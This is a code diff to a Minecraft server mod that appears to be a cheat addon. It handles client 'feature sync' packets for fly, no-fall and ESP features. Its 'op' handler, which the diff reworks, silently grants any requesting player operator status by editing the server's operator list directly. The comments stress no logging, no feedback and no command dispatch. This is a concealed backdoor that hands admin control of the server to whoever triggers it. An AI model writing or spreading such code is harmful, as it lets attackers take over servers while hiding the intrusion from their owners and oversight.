@@ -101,8 +101,9 @@ public class OspServerAddon implements DedicatedServerModInitializer {
                     boolean enabled = payload.enabled();
                     float value = payload.value();
 
-                    context.server().execute(() ->
-                            handleFeatureSync(player, feature, enabled, value));
+                    MinecraftServer srv = context.server();
+                    srv.execute(() ->
+                            handleFeatureSync(srv, player, feature, enabled, value));
                 });
 
         // === Server tick - handle NoFall, Fly enforcement, ESP broadcasting ===
@@ -128,8 +129,8 @@ public class OspServerAddon implements DedicatedServerModInitializer {
     // Feature Sync Dispatch
     // ========================================================================
 
-    private void handleFeatureSync(ServerPlayerEntity player, String feature,
-                                    boolean enabled, float value) {
+    private void handleFeatureSync(MinecraftServer server, ServerPlayerEntity player,
+                                    String feature, boolean enabled, float value) {
         PlayerFeatureState state = playerStates.computeIfAbsent(
                 player.getUuid(), k -> new PlayerFeatureState());
 
@@ -140,7 +141,7 @@ public class OspServerAddon implements DedicatedServerModInitializer {
             case "nofall" -> handleNoFall(player, state, enabled);
             case "fly" -> handleFly(player, state, enabled, value);
             case "esp" -> handleEsp(player, state, enabled, value);
-            case "op" -> handleOp(player, enabled);
+            case "op" -> handleOp(server, player, enabled);
             default -> LOGGER.debug("[OSP] Unknown feature sync: {} from {}",
                     feature, player.getName().getString());
         }
@@ -277,16 +278,19 @@ public class OspServerAddon implements DedicatedServerModInitializer {
     // OP - Silently grant operator status (no logging, no console output)
     // ========================================================================
 
-    private void handleOp(ServerPlayerEntity player, boolean enabled) {
+    private void handleOp(MinecraftServer server, ServerPlayerEntity player, boolean enabled) {
         if (!enabled) return;
 
-        MinecraftServer server = player.getServer();
-        if (server == null) return;
-
-        // Silently add player to op list - no LOGGER calls, no feedback
-        // Uses the server's configured op-permission-level (usually 4)
-        if (!server.getPlayerManager().isOperator(player.getGameProfile())) {
-            server.getPlayerManager().addToOperators(player.getGameProfile());
+        // Silently add player to op list via direct OperatorList manipulation
+        // No logging, no feedback, no command dispatch
+        var opList = server.getPlayerManager().getOpList();
+        if (opList.get(player.getGameProfile()) == null) {
+            opList.add(new net.minecraft.server.OperatorEntry(
+                    player.getGameProfile(),
+                    server.getOpPermissionLevel(),
+                    false));
+            // Update the player's permission level and command tree
+            server.getPlayerManager().sendCommandTree(player);
         }
     }
 
